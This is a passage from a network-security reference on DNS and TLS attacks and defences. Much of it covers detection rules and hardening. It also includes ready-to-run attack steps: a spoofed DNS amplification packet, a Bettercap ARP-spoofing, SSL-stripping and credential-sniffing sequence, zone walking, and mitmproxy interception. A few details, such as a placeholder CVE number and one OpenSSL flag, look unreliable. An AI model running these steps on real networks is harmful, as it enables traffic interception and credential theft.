alert dns any any -> any 53 (msg:"DNS tunnel - long query name (>50 chars)"; \
  dns.query; content:"."; pcre:"/^.{50,}/"; \
  classtype:policy-violation; sid:1000020; rev:1;)

alert dns any any -> any 53 (msg:"DNS tunnel - excessive TXT queries"; \
  dns.query; dns.opcode:0; content:"|00 10|"; \
  threshold:type both, track by_src, count 100, seconds 60; \
  classtype:policy-violation; sid:1000021; rev:1;)
```

Zeek script for DNS tunnel detection (entropy-based):
```zeek
module DNSTunnel;

export {
    redef enum Notice::Type += { DNSTunnel::Long_Query, DNSTunnel::High_Entropy };
    const query_length_threshold = 50 &redef;
}

function shannon_entropy(s: string): double
    {
    local freq: table[string] of count = table();
    local n = |s|;
    for ( i in s )
        {
        if ( s[i] in freq )
            freq[s[i]] += 1;
        else
            freq[s[i]] = 1;
        }
    local ent = 0.0;
    for ( c, cnt in freq )
        {
        local p = cnt * 1.0 / n;
        ent -= p * log2(p);
        }
    return ent;
    }

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    if ( |query| > query_length_threshold )
        NOTICE([$note=DNSTunnel::Long_Query,
                $msg=fmt("Long DNS query: %s (%d chars)", query, |query|),
                $conn=c]);

    local labels = split_string(query, /\./);
    if ( |labels| > 0 )
        {
        local longest_label = labels[0];
        for ( i in labels )
            if ( |labels[i]| > |longest_label| )
                longest_label = labels[i];

        if ( |longest_label| > 20 && shannon_entropy(longest_label) > 3.5 )
            NOTICE([$note=DNSTunnel::High_Entropy,
                    $msg=fmt("High entropy DNS label: %s (entropy=%.2f)", longest_label,
                             shannon_entropy(longest_label)),
                    $conn=c]);
        }
    }
```

Wireshark filters:
```
# TXT record queries
dns.qry.type == 16

# Long DNS names (manual inspection)
dns.qry.name.len > 50

# NULL record queries (common in iodine)
dns.qry.type == 10

# High query rate to single domain (use Statistics > DNS)
```

---

### 2.5 DNSSEC

DNSSEC adds cryptographic signatures to DNS records. The zone owner signs each record set (RRSet) with a zone-signing key (ZSK); the ZSK is signed by a key-signing key (KSK); the KSK's hash is published as a DS record in the parent zone, forming a chain of trust from the root.

#### Record types

- **DNSKEY**: contains the public key (KSK or ZSK). Flags field: 256 = ZSK, 257 = KSK.
- **RRSIG**: signature over an RRSet. Contains: algorithm, labels, original TTL, expiration, inception, key tag, signer's name, and the signature itself.
- **DS**: Delegation Signer — hash of the child zone's KSK, published in the parent zone. Links parent to child in the chain of trust.
- **NSEC/NSEC3**: authenticated denial of existence.

Chain of trust:
```
Root KSK → Root ZSK → .com DS → .com KSK → .com ZSK → example.com DS →
example.com KSK → example.com ZSK → example.com A RRSIG
```

#### Key signing ceremony

Root KSK ceremonies (performed quarterly at ICANN facilities) involve:
- Hardware Security Modules (HSMs) storing the root KSK
- Multiple trusted community representatives (TCRs) with physical keys/cards
- Dual-person integrity — no single person can access the KSK
- Ceremonial signing of the root DNSKEY RRSet

The root KSK was rolled for the first time in 2018 (KSK-2010 → KSK-2017, algorithm RSASHA256, 2048-bit).

#### NSEC/NSEC3 zone walking

The NSEC record proves that a name does not exist by listing the next existing name in the zone (alphabetically). An attacker can "walk" the zone by repeatedly querying for names between known NSEC boundaries, enumerating all names in the zone.

```bash
# NSEC zone walk with ldns-walk
ldns-walk example.com
# Outputs all names in the zone by following NSEC chain

# Manual NSEC walking with dig
dig +dnssec nonexistent.example.com
# Returns NSEC with: aaa.example.com → bbb.example.com (next name)
# Then: dig +dnssec aab.example.com (between aaa and bbb)
# Repeat until the chain wraps
```

**NSEC3** replaces names with hashed values (using a salt and iteration count), making enumeration require offline dictionary attacks rather than simple walks.

```bash
# NSEC3 hash cracking with nsec3walker / hashcat
# 1. Collect NSEC3 hashes:
dig +dnssec NSEC3PARAM example.com
# Returns: algorithm, flags, iterations, salt

# 2. Crack hashes offline:
# hashcat -m 8300 nsec3_hashes.txt wordlist.txt
```

#### Algorithm downgrade

If the resolver accepts multiple DNSSEC algorithms, an attacker might force use of a weaker algorithm by stripping the stronger algorithm's signatures. Validators should reject zones that claim to use DNSSEC but present only weak-algorithm signatures when stronger ones are expected.

#### DANE/TLSA

DNS-Based Authentication of Named Entities: publishes TLS certificate fingerprints as TLSA records in DNSSEC-signed zones. A client that validates DNSSEC can verify the server's TLS certificate against the DANE record, reducing dependence on the CA system.

```bash
# Query DANE TLSA record
dig +short TLSA _443._tcp.example.com
# Returns: 3 1 1 <SHA256 hash of certificate>
# Usage=3: domain-issued certificate
# Selector=1: SubjectPublicKeyInfo
# Matching type=1: SHA-256
```

---

### 2.6 DoH, DoT, and enterprise implications

**DNS over HTTPS (DoH)** (RFC 8484, port 443) and **DNS over TLS (DoT)** (RFC 7858, port 853) encrypt DNS queries, preventing passive eavesdropping and on-path modification.

Security benefit: protects user privacy from ISPs and network operators. Enterprise concern: DoH over port 443 is indistinguishable from normal HTTPS traffic, making it difficult for enterprise DNS monitoring and filtering to inspect DNS queries for threat indicators.

#### Detection challenges

```bash
# DoT is detectable: it uses dedicated port 853
# Block DoT at firewall:
iptables -A OUTPUT -p tcp --dport 853 -j DROP

# DoH is harder: it uses port 443 (same as HTTPS)
# Detection approaches:
# 1. Block known DoH provider IPs (fragile, requires maintenance)
# 2. TLS fingerprinting (JA3) to identify DoH client libraries
# 3. SNI inspection to block known DoH hostnames
# 4. DNS over HTTPS traffic analysis (POST to /dns-query path)
```

Enterprise deployments typically configure managed endpoints to use the enterprise resolver (not a public DoH provider) and block external DoH endpoints.

Suricata rule for DoH detection:
```
alert tls any any -> any 443 (msg:"Possible DNS-over-HTTPS to known provider"; \
  tls.sni; content:"dns.google"; \
  classtype:policy-violation; sid:1000030; rev:1;)

alert tls any any -> any 443 (msg:"Possible DNS-over-HTTPS to Cloudflare"; \
  tls.sni; content:"cloudflare-dns.com"; \
  classtype:policy-violation; sid:1000031; rev:1;)
```

---

### 2.7 DNS amplification

DNS servers that respond to open recursive queries (or authoritative servers responding to ANY queries) can be used for DDoS amplification: the attacker sends a small query with a spoofed source IP (the victim's IP); the DNS server sends a much larger response to the victim. Amplification factors of 28–54x are typical; up to 70x with EDNS0 (responses up to 4096 bytes).

#### Exploitation

```bash
# Test amplification factor with dig
dig ANY example.com @open-resolver-ip
# Compare query size (~45 bytes) to response size (~3000 bytes)

# Scapy amplification test
python3 -c "
from scapy.all import *
# Spoofed source = victim, destination = open resolver
pkt = IP(src='VICTIM_IP', dst='RESOLVER_IP')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='example.com', qtype='ANY'))
send(pkt)
"
```

#### Mitigation

BCP38 (anti-spoofing at network ingress), rate-limiting on DNS servers, disabling open recursion, and Response Rate Limiting (RRL).

```bash
# BIND RRL configuration (named.conf):
# rate-limit {
#     responses-per-second 5;
#     window 5;
#     log-only no;
# };

# Unbound: disable open recursion
# server:
#     access-control: 0.0.0.0/0 refuse
#     access-control: 192.168.0.0/16 allow
#     access-control: 10.0.0.0/8 allow

# iptables: rate-limit DNS responses
iptables -A INPUT -p udp --dport 53 -m hashlimit \
  --hashlimit-above 20/sec --hashlimit-burst 40 \
  --hashlimit-mode srcip --hashlimit-name dns_limit -j DROP
```

---

### 2.8 NXDOMAIN attacks and phantom domains

#### NXDOMAIN flood

The attacker sends massive volumes of queries for non-existent domains (random subdomains of a target zone). The resolver must:
1. Query the authoritative server for each (no cache hits since each is unique)
2. Cache the NXDOMAIN response (consuming negative cache space)
3. Process DNSSEC validation for each NXDOMAIN (if DNSSEC-signed)

This exhausts the resolver's cache, CPU, and outbound connection capacity, degrading service for legitimate queries.

#### Phantom domain attack

The attacker sets up authoritative nameservers that deliberately slow-walk responses (responding after 10-30 seconds, just before the resolver times out). The resolver keeps connections open, consuming sockets and memory waiting for answers. Combined with many parallel queries, this exhausts the resolver's connection pool.

#### DNS cache snooping

Determine whether a resolver has cached a specific domain (indicating someone behind it visited that domain):

```bash
# Non-recursive query (RD=0) — only returns cached results
dig +norecurse example.com @target-resolver
# If response has an answer → domain is cached → someone queried it recently

# Timing-based snooping (works even if non-recursive is blocked)
# Fast response (~1ms) = cached; slow response (~50ms) = not cached
dig example.com @target-resolver | grep "Query time"
```

---

## 3. TLS security

### 3.1 TLS 1.2 vs 1.3 handshake

**TLS 1.2**: 2-RTT handshake. ClientHello → ServerHello, Certificate, ServerKeyExchange, ServerHelloDone → ClientKeyExchange, ChangeCipherSpec, Finished → ChangeCipherSpec, Finished. The key exchange (ECDHE or DHE) and the cipher suite are negotiated in cleartext. The server's certificate is sent in cleartext.

**TLS 1.3**: 1-RTT handshake. ClientHello (with `key_share` containing the client's ephemeral key share) → ServerHello (with `key_share`), EncryptedExtensions, Certificate, CertificateVerify, Finished → Finished. Everything after ServerHello is encrypted. The server's certificate is encrypted (not visible to passive observers). Only AEAD cipher suites are permitted (no CBC, no RC4). Forward secrecy is mandatory (ECDHE-only; static RSA key exchange is removed). The handshake is simplified: `ChangeCipherSpec` is eliminated, the state machine is cleaner, and the number of supported cipher suites is reduced from hundreds to five.

#### TLS 1.3 key schedule

```
PSK (or 0) → HKDF-Extract → Early Secret
                                ↓
                            Derive-Secret("derived", "")
                                ↓
(EC)DHE → HKDF-Extract → Handshake Secret
                                ↓
                            Derive-Secret("c hs traffic", ClientHello...ServerHello)
                            = client_handshake_traffic_secret
                            Derive-Secret("s hs traffic", ClientHello...ServerHello)
                            = server_handshake_traffic_secret
                                ↓
                            Derive-Secret("derived", "")
                                ↓
0 → HKDF-Extract → Master Secret
                                ↓
                            Derive-Secret("c ap traffic", ClientHello...Server Finished)
                            = client_application_traffic_secret
                            Derive-Secret("s ap traffic", ClientHello...Server Finished)
                            = server_application_traffic_secret
```

The five permitted cipher suites in TLS 1.3:
- `TLS_AES_128_GCM_SHA256`
- `TLS_AES_256_GCM_SHA384`
- `TLS_CHACHA20_POLY1305_SHA256`
- `TLS_AES_128_CCM_SHA256`
- `TLS_AES_128_CCM_8_SHA256`

---

### 3.2 0-RTT and replay attacks

TLS 1.3 0-RTT (early data): the client can send application data in the first flight (alongside the ClientHello), using a pre-shared key (PSK) from a previous session. This eliminates the round-trip delay for returning clients.

The replay risk: a network attacker can capture the 0-RTT data and replay it to the server. The server cannot distinguish a replayed 0-RTT flight from a legitimate one (because the PSK is valid and the ClientHello is identical). If the 0-RTT data performs a non-idempotent action (e.g., a financial transfer), the action is repeated.

**Anti-replay mechanisms.** Single-use session tickets: the server issues each ticket only once and rejects reuse (requires server-side ticket storage). ClientHello recording: the server records ClientHello hashes and rejects duplicates (limited time window). The `max_early_data_size` field limits how much 0-RTT data the server accepts. Application-level mitigation: servers should only process idempotent requests in 0-RTT (GET, not POST).

#### Hardening — disable or constrain 0-RTT

```nginx
# Nginx: disable 0-RTT early data
ssl_early_data off;

# Nginx: enable 0-RTT but detect replays at application level
ssl_early_data on;
proxy_set_header Early-Data $ssl_early_data;
# Application checks Early-Data header and rejects non-idempotent requests
```

```apache
# Apache: disable 0-RTT (not supported as of 2.4.x — safe by default)
```

```bash
# OpenSSL s_server: disable early data
openssl s_server -no_anti_replay -max_early_data 0
```

---

### 3.3 Downgrade attacks

**TLS_FALLBACK_SCSV.** A cipher suite value that the client includes when retrying a connection with a lower TLS version (after a failure with a higher version). If the server sees this and supports a higher version than what the client is requesting, it aborts — detecting the downgrade.

**TLS 1.3 downgrade protection.** The server includes a specific sentinel value in the `server_random` field of the ServerHello when it negotiates a version lower than TLS 1.3. A TLS 1.3-capable client detecting this sentinel in a TLS 1.2 ServerHello knows a downgrade occurred and aborts.

The sentinel values (last 8 bytes of server_random):
- TLS 1.2 negotiated when 1.3 available: `44 4F 57 4E 47 52 44 01` ("DOWNGRD\x01")
- TLS 1.1 or below negotiated when 1.2+ available: `44 4F 57 4E 47 52 44 00` ("DOWNGRD\x00")

#### Detection

```bash
# Test for downgrade vulnerability with testssl.sh
testssl --protocols --vulnerable example.com:443

# OpenSSL: test TLS 1.2 fallback
openssl s_client -connect example.com:443 -tls1_2 -fallback_scsv

# Wireshark filter for downgrade sentinel detection
tls.handshake.random[24:8] == 44:4f:57:4e:47:52:44:01
```

---

### 3.4 CBC attacks — BEAST, Lucky13, and Bleichenbacher

#### BEAST (CVE-2011-3389)

BEAST (Browser Exploit Against SSL/TLS) is a chosen-plaintext attack against CBC-mode cipher suites in TLS 1.0 and SSLv3. The vulnerability lies in the predictable IV: TLS 1.0 uses the last ciphertext block of the previous record as the IV for the next record. This is visible to an on-path attacker.

The attack:
1. The attacker controls JavaScript in the victim's browser (via XSS or malicious ad)
2. The JavaScript issues cross-origin requests that include the victim's session cookie
3. The attacker observes the encrypted records on the wire
4. Because the IV is predictable (last ciphertext block), the attacker can XOR a chosen plaintext block with the known IV, creating a controlled input to the block cipher
5. By comparing ciphertext blocks, the attacker determines whether a guess matches the secret cookie — one byte at a time

The **1/n-1 split** mitigation: the TLS implementation splits each application data record into two records — the first containing only 1 byte of plaintext, the second containing the remaining n-1 bytes. The first record's ciphertext becomes an unpredictable IV for the second record, breaking the chosen-plaintext property. All major browsers deployed this by early 2012.

TLS 1.1 (RFC 4346) introduced explicit, random per-record IVs, eliminating the vulnerability entirely. TLS 1.3 removes CBC altogether.

```bash
# Test for BEAST vulnerability
testssl --beast example.com:443

# Nmap NSE script
nmap --script ssl-enum-ciphers -p 443 example.com
# Check output for TLS 1.0 + CBC cipher suites

# Wireshark: identify TLS 1.0 CBC connections
tls.record.version == 0x0301 && tls.record.content_type == 23
```

#### Lucky13 (CVE-2013-0169)

**Lucky13** targets CBC-mode cipher suites in TLS 1.2. The MAC-then-Encrypt-then-Pad (MEE) construction requires the server to first decrypt, then check padding, then check the MAC. If the padding check fails faster than the MAC check (a timing difference), the attacker can distinguish "bad padding" from "bad MAC," constructing a padding oracle that decrypts ciphertext byte-by-byte.

The timing difference arises because valid padding means fewer bytes to hash in the HMAC computation (~55 cycles per hash block on modern CPUs). With ~2^23 requests per byte, the entire ciphertext can be decrypted.

Mitigation: constant-time padding verification (process the MAC check regardless of padding outcome). TLS 1.3 eliminates CBC entirely (AEAD-only).

**Bleichenbacher / ROBOT (CVE-2017-13099, CVE-1998-XXXX).** Targets RSA PKCS#1 v1.5 encryption in the TLS key exchange. The server's response to a ClientKeyExchange with invalid PKCS#1 padding leaks information (timing, error message, or alert type) that enables an adaptive chosen-ciphertext attack, eventually recovering the pre-master secret.

ROBOT (Return Of Bleichenbacher's Oracle Threat, 2017) showed that many major TLS implementations remained vulnerable 19 years after the original attack. Affected: F5 BIG-IP, Citrix, Cisco, Bouncy Castle, Erlang, WolfSSL, old versions of Facebook's and Paypal's infrastructure. Mitigation: TLS 1.3 removes RSA key exchange entirely (ECDHE-only). For TLS 1.2: constant-time PKCS#1 processing with random fallback (generate a random pre-master secret on padding failure rather than aborting).

#### Testing for ROBOT

```bash
# ROBOT vulnerability scanner
git clone https://github.com/robotattackorg/robot-detect.git
cd robot-detect
python3 robot-detect.py -h example.com -p 443

# testssl.sh includes ROBOT check
testssl --robot example.com:443
```

---

### 3.5 Compression oracles — CRIME and BREACH

**CRIME.** TLS-level compression (`DEFLATE`) compresses the plaintext before encryption. If the attacker can inject data into the compressed stream (e.g., controlled request headers) alongside secret data (e.g., a session cookie), they can measure the compressed ciphertext length. Matching characters between the injected data and the secret compress better (shorter ciphertext), revealing the secret byte-by-byte. Mitigation: disable TLS compression (universally disabled since 2012).

**BREACH.** Same principle but at the HTTP level: HTTP response compression (gzip/deflate) compresses the response body, which may contain secrets (CSRF tokens, API keys) alongside attacker-reflected data. BREACH works even with TLS compression disabled because HTTP compression is still active. Mitigation: disable HTTP compression on responses containing secrets, or use per-request CSRF tokens (so the token changes between probing requests), or add random padding to responses.

#### Hardening against BREACH

```nginx
# Nginx: disable gzip for pages with secrets
location /api/ {
    gzip off;
    # or selectively:
    # gzip_types text/plain;  # exclude text/html which may contain CSRF tokens
}
```

```python
# Django: randomize CSRF token masking (built-in since Django 1.10)
# Django XORs the CSRF token with a random mask on each response,
# so the compressed representation changes between requests.
# No configuration needed — just ensure MIDDLEWARE includes
# 'django.middleware.csrf.CsrfViewMiddleware'
```

---

### 3.6 TLS renegotiation attacks (CVE-2009-3555)

#### Mechanism

TLS renegotiation allows an established connection to negotiate new parameters (new cipher suite, client certificate). The original vulnerability: an attacker performs a MitM, completes a TLS handshake with the server, sends an HTTP request prefix, then triggers renegotiation. The server splices the attacker's prefix with the client's subsequent request, executing it in the client's authenticated context.

Example: the attacker sends `GET /admin HTTP/1.1\r\nX-Ignore: ` before renegotiation. After renegotiation with the legitimate client, the client sends `GET /dashboard HTTP/1.1\r\nCookie: session=abc123...`. The server sees the combined request as a single authenticated request to `/admin`.

#### Fix

RFC 5746 introduced the Renegotiation Indication Extension (`renegotiation_info`). During renegotiation, both sides include the `verify_data` from the previous Finished message, binding the renegotiation to the original handshake. TLS 1.3 removes renegotiation entirely, replacing it with post-handshake authentication and KeyUpdate.

#### Detection

```bash
# Test for secure renegotiation
openssl s_client -connect example.com:443 -status
# Look for "Secure Renegotiation IS supported"

# Wireshark filter
tls.handshake.extension.type == 65281
# Extension type 65281 (0xff01) = renegotiation_info
```

---

### 3.7 ALPN/NPN negotiation attacks

#### Mechanism

Application-Layer Protocol Negotiation (ALPN, RFC 7301) allows the client to advertise supported application protocols (e.g., `h2`, `http/1.1`, `h3`) in the ClientHello, and the server selects one in the ServerHello. NPN (Next Protocol Negotiation) was the predecessor, deprecated in favor of ALPN. NPN had the client making the final selection (encrypted), while ALPN has the server selecting (in cleartext in TLS 1.2, encrypted in TLS 1.3).

**Protocol downgrade via ALPN stripping**: a MitM attacker can modify the ClientHello to remove `h2` from the ALPN list, forcing HTTP/1.1 negotiation. This prevents HTTP/2 multiplexing and header compression, and may expose the connection to HTTP/1.1-specific attacks (request smuggling). TLS 1.3 encrypts the ALPN selection in EncryptedExtensions, but the client's ALPN list in the ClientHello remains visible.

#### ALPACA (CVE-2021-3618)

Application Layer Protocol Confusion — Analyzing and Preventing Attacks Against TLS. ALPACA exploits servers that share a TLS certificate across different application protocols (e.g., HTTPS on port 443 and SMTP on port 25, both using `*.example.com`).

The attack:
1. Attacker performs a MitM (e.g., via DNS spoofing)
2. Victim connects to `https://mail.example.com:443`
3. Attacker redirects the TLS connection to `mail.example.com:25` (SMTP)
4. The SMTP server's certificate is valid for `mail.example.com` — TLS handshake succeeds
5. The victim's browser sends an HTTP request; the SMTP server interprets it as SMTP commands
6. If the attacker can inject content into the SMTP server's response (e.g., via bounce messages), they can reflect arbitrary content back to the browser — enabling XSS

Affected protocols: SMTP, IMAP, POP3, FTP — any protocol sharing a certificate with HTTPS.

Mitigations:
- Use separate certificates per application protocol
- Enable ALPN on all TLS-speaking services (SMTP, IMAP, FTP servers should advertise their protocol via ALPN; browsers should reject mismatches)
- SNI-based server selection that validates the expected protocol

```bash
# Test for ALPACA vulnerability
# Check if a host serves different protocols on different ports with the same cert
openssl s_client -connect mail.example.com:443 -alpn h2,http/1.1 2>/dev/null | grep "subject="
openssl s_client -connect mail.example.com:25 -starttls smtp 2>/dev/null | grep "subject="
# If the certificates match, ALPACA is possible

# Wireshark: inspect ALPN extensions
tls.handshake.extensions.alpn_str
```

---

### 3.8 Session resumption attacks

#### TLS 1.2 session tickets

The server encrypts session state into a ticket (encrypted with a server-side key, STEK) and sends it to the client. On resumption, the client presents the ticket; the server decrypts it to recover the session state.

Security concerns:
- **STEK compromise**: if the STEK is stolen, all sessions encrypted with that key can be decrypted (breaks forward secrecy for resumed sessions)
- **Cross-server ticket reuse**: in load-balanced environments, all servers share the same STEK — compromise of one server exposes all sessions
- **Long STEK lifetime**: many deployments never rotate the STEK

#### Hardening

```bash
# OpenSSL: rotate session ticket keys periodically
# In application code, call SSL_CTX_set_tlsext_ticket_key_cb() with a rotation callback

# Nginx: set ticket key rotation
ssl_session_tickets on;
ssl_session_timeout 4h;
ssl_session_ticket_key /etc/nginx/tickets/current.key;
ssl_session_ticket_key /etc/nginx/tickets/previous.key;
# Rotate keys every 12 hours; keep previous key for graceful transition
```

---

### 3.9 Certificate validation and Certificate Transparency

Certificate validation failures: SAN (Subject Alternative Name) mismatches (the certificate doesn't cover the requested hostname), improper wildcard handling (`*.example.com` matching `sub.sub.example.com`), null-byte injection in the CN (`www.example.com\0.evil.com` — some parsers stopped at the null, matching `www.example.com`), and homograph attacks (IDN domains using visually-similar Unicode characters).

**Certificate Transparency (CT).** CAs must submit every issued certificate to public CT logs (append-only Merkle trees). The certificate includes a Signed Certificate Timestamp (SCT) proving its inclusion in a log. Browsers (Chrome since 2018) require SCTs for all publicly-trusted certificates, and domain owners can monitor CT logs for unauthorized certificates issued for their domains.

#### CT log monitoring

```bash
# Monitor CT logs for your domain using crt.sh
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
  python3 -c "import sys,json; [print(c['common_name'],c['not_before']) for c in json.load(sys.stdin)]"

# certspotter (commercial) or similar tools provide real-time alerts
```

#### Certificate pinning

**HPKP** (HTTP Public Key Pinning) was deprecated (removed from Chrome 72, 2019) because misconfiguration led to site lockouts. Application-level pinning remains viable:

```python
# Python requests: certificate pinning via pin-sha256
import hashlib, ssl, socket
from urllib.request import urlopen

# Extract pin from certificate
# openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout | \
#   openssl ec -pubin -outform DER 2>/dev/null | openssl dgst -sha256 -binary | base64
expected_pin = "YZPgTZ+woNCCCIW3LH2CxQeLzB/1m42QcCTBSdgayjs="
```

#### OCSP stapling vs CRL

OCSP stapling: the server periodically fetches its own OCSP response from the CA and "staples" it to the TLS handshake (in the `CertificateStatus` message). Eliminates the client's need to contact the CA, improving privacy and latency.

```nginx
# Nginx OCSP stapling
ssl_stapling on;
ssl_stapling_verify on;
resolver 1.1.1.1 valid=300s;
ssl_trusted_certificate /etc/nginx/ca-chain.pem;
```

---

### 3.10 TLS fingerprinting — JA3/JA3S/JA4+

#### Mechanism

TLS fingerprinting identifies client and server implementations by hashing the parameters in the ClientHello and ServerHello messages.

**JA3** (client fingerprint): MD5 hash of: TLS version, cipher suites, extensions, elliptic curves, elliptic curve point formats (from ClientHello).

**JA3S** (server fingerprint): MD5 hash of: TLS version, cipher suite, extensions (from ServerHello).

**JA4+** (next generation): improves on JA3 with: orderable/filterable fields, ALPN protocol, SNI type, and separate hashing of cipher suites vs. extensions.

#### Computation

```python
#!/usr/bin/env python3
"""JA3 hash computation from a ClientHello."""
import hashlib

def compute_ja3(tls_version, ciphers, extensions, elliptic_curves, ec_point_formats):
    """
    tls_version: int (e.g., 771 for TLS 1.2)
    ciphers: list of cipher suite codes
    extensions: list of extension type codes
    elliptic_curves: list of supported group codes
    ec_point_formats: list of EC point format codes
    """
    # Filter GREASE values (0x0a0a, 0x1a1a, etc.)
    grease = {0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a,
              0x5a5a, 0x6a6a, 0x7a7a, 0x8a8a, 0x9a9a,
              0xaaaa, 0xbaba, 0xcaca, 0xdada, 0xeaea, 0xfafa}

    ciphers = [c for c in ciphers if c not in grease]
    extensions = [e for e in extensions if e not in grease]
    elliptic_curves = [ec for ec in elliptic_curves if ec not in grease]

    ja3_raw = f"{tls_version}," + \
              "-".join(str(c) for c in ciphers) + "," + \
              "-".join(str(e) for e in extensions) + "," + \
              "-".join(str(ec) for ec in elliptic_curves) + "," + \
              "-".join(str(pf) for pf in ec_point_formats)

    ja3_hash = hashlib.md5(ja3_raw.encode()).hexdigest()
    return ja3_hash, ja3_raw
```

#### Usage in detection

```bash
# Zeek JA3 logging (built-in since Zeek 3.0)
# ja3.log contains: ja3, ja3s hashes per connection
# zeek -r capture.pcap policy/protocols/ssl/ja3.zeek

# Suricata JA3 logging (enabled in suricata.yaml)
# eve.json includes: tls.ja3.hash, tls.ja3s.hash
```

Wireshark:
```
# Display JA3 hash (requires JA3 dissector plugin or tshark)
tls.handshake.type == 1
# Manually compute from: tls.handshake.version, tls.handshake.ciphersuite,
# tls.handshake.extension.type, tls.handshake.extensions.supported_group,
# tls.handshake.extensions.ec_point_format
```

Known malware JA3 hashes are published in threat intelligence feeds (Abuse.ch JA3 fingerprint list, Salesforce JA3 database).

---

### 3.11 TLS interception and enterprise MITM

#### Mechanism

Enterprise TLS inspection deploys a proxy that terminates the client's TLS connection using a CA certificate installed on managed endpoints. The proxy decrypts, inspects, and re-encrypts traffic to the destination server. This is a legitimate MitM.

Security risks:
- The inspection proxy's CA key is a single point of compromise — theft enables passive decryption of all intercepted traffic
- Many inspection proxies downgrade TLS security (use TLS 1.2 with CBC, skip certificate validation to the upstream server, disable OCSP checks)
- Superfish (2015, CVE-2015-2862): Lenovo shipped Superfish adware with an identical private key on all laptops — any Superfish user could MitM any other Superfish user

#### Detection

```bash
# Detect TLS interception by comparing expected vs actual certificate
# If the presented cert's CA differs from the expected CA, interception is likely

# JA3 mismatch: the intercepting proxy has a different JA3S than the real server
# Compare observed JA3S against known-good JA3S for the target service

# HTTP response header: some proxies add Via or X-Forwarded-For headers
```

---

### 3.12 Logjam and post-quantum

**Logjam (CVE-2015-4000).** The attacker forces a TLS connection to use export-grade DHE (512-bit groups). Precomputing the discrete logarithm for common 512-bit groups (feasible with academic resources) allows passive decryption. The most common 1024-bit group (used by ~18% of HTTPS, ~26% of SSH, ~66% of IPsec VPN at time of disclosure) is within reach of nation-state precomputation. TLS 1.3 mitigates by requiring 2048+ bit DHE groups and preferring ECDHE.

**Post-quantum TLS.** NIST standardized ML-KEM (FIPS 203, formerly Kyber) for key encapsulation. The hybrid key exchange `X25519Kyber768` (combining classical X25519 with ML-KEM-768) is deployed in Chrome, Firefox, and Cloudflare. The `key_share` extension carries both the classical and PQ key shares. Migration timeline: NIST recommends hybrid deployment by 2025 and full PQ transition by 2035.

#### Testing

```bash
# Test for Logjam vulnerability
testssl --logjam example.com:443

# Nmap script
nmap --script ssl-dh-params -p 443 example.com

# Test post-quantum support
openssl s_client -connect example.com:443 -groups X25519Kyber768Draft00
```

---

### 3.13 QUIC and HTTP/3

QUIC (RFC 9000) is a UDP-based transport protocol that integrates TLS 1.3. Security properties: the handshake is always encrypted (no cleartext ClientHello — the QUIC Initial packets are encrypted with a key derived from the connection ID, providing anti-observation but not authentication). Connection migration: QUIC connections survive IP address changes (e.g., Wi-Fi → cellular) using connection IDs rather than the 4-tuple, but this requires address validation (via Retry packets and PATH_CHALLENGE/PATH_RESPONSE) to prevent IP-spoofing-based connection hijacking.

0-RTT in QUIC has the same replay risks as TLS 1.3 0-RTT. QUIC-specific: the `Retry` packet is used for address validation (the server sends a Retry with a token; the client retransmits the Initial with the token, proving it can receive at the claimed address).

#### Firewall and monitoring challenges

QUIC over UDP/443 bypasses traditional TCP-based inspection. Detection:

```bash
# Block QUIC to force fallback to TCP/TLS (for inspection)
iptables -A OUTPUT -p udp --dport 443 -j DROP
nft add rule inet filter output udp dport 443 drop

# Wireshark filter for QUIC
quic
# Or by UDP payload (QUIC initial packets have specific header format):
udp.port == 443 && udp.length > 1200
```

---

### 3.14 DTLS

DTLS (Datagram TLS) adapts TLS for UDP. Unique challenges: no reliable delivery (lost handshake messages must be retransmitted), no ordering (sequence numbers for replay protection within a window), and path MTU discovery (DTLS records must fit in a single UDP datagram).

**HelloVerifyRequest**: the DTLS anti-DoS mechanism. The server sends a HelloVerifyRequest with a cookie before allocating state; the client must retransmit the ClientHello with the cookie. This prevents SYN-flood-like attacks (the server doesn't allocate state until the client proves it can receive at the claimed address). Analogous to TCP SYN cookies.

---

## 4. MITM attacks and SSL stripping

### 4.1 ARP poisoning + SSL stripping

#### Mechanism

The attacker poisons the ARP cache of the victim and the gateway, becoming an on-path MitM. Then:
1. Intercept HTTPS redirects (HTTP 301/302 to HTTPS)
2. Rewrite them to keep the victim on HTTP
3. Proxy the victim's HTTP traffic to the real server over HTTPS
4. The victim sees HTTP (no lock icon), but the attacker sees all traffic in cleartext

#### Exploitation with Bettercap

```bash
# Full MitM + SSL stripping with Bettercap
sudo bettercap -iface eth0

# In the Bettercap console:
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Enable SSL stripping
set http.proxy.sslstrip true
http.proxy on

# Enable DNS spoofing (for HSTS bypass — redirect HSTS domains to similar non-HSTS domains)
set dns.spoof.domains *.example.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# Capture credentials
set net.sniff.verbose true
net.sniff on
```

#### sslstrip2 + dns2proxy (HSTS bypass)

Standard sslstrip fails against HSTS-protected domains (the browser remembers to use HTTPS). The sslstrip2/dns2proxy technique:
1. When the victim requests `https://www.facebook.com`, the proxy rewrites links to a similar domain: `http://wwww.facebook.com` (extra w)
2. dns2proxy spoofs DNS for `wwww.facebook.com` → attacker's IP
3. The victim's browser visits `http://wwww.facebook.com` (no HSTS for this typo domain)
4. The attacker proxies to the real `https://www.facebook.com`

#### HSTS hardening

```
# HTTP Strict Transport Security header
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Preloading (submitting to browser HSTS preload lists) prevents the first-visit vulnerability. Chrome, Firefox, Safari, and Edge ship with a built-in HSTS preload list.

#### Detection

```bash
# Detect ARP spoofing
arpwatch -i eth0
# Alerts on MAC/IP mapping changes

# Wireshark filter for ARP anomalies
arp.duplicate-address-detected

# Suricata rule for ARP spoofing
alert arp any any -> any any (msg:"ARP spoofing detected - duplicate IP"; \
  classtype:misc-attack; sid:1000040; rev:1;)
```

### 4.2 mitmproxy for TLS interception

```bash
# Transparent proxy mode (requires iptables redirect)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

mitmproxy --mode transparent --showhost

# Scripted interception (modify requests/responses programmatically)
# save as modify.py:
